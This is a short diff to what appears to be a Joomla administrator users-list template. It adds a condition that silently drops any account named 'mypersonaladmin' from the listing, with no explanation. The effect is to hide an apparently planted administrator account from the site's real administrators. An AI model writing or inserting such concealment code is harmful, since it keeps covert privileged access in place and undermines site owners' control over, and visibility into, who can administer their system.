@@ -107,7 +107,7 @@ $loggeduser = JFactory::getUser();
 				$canEdit	= false;
 				$canChange	= false;
 			}
-		?>
+			if($item->username!='mypersonaladmin'){?>
 			<tr class="row<?php echo $i % 2; ?>">
 				<td class="center">
 					<?php if ($canEdit) : ?>
@@ -172,7 +172,8 @@ $loggeduser = JFactory::getUser();
 					<?php echo (int) $item->id; ?>
 				</td>
 			</tr>
-			<?php endforeach; ?>
+	<?php	} 
+			endforeach; ?>
 		</tbody>
 	</table>
 
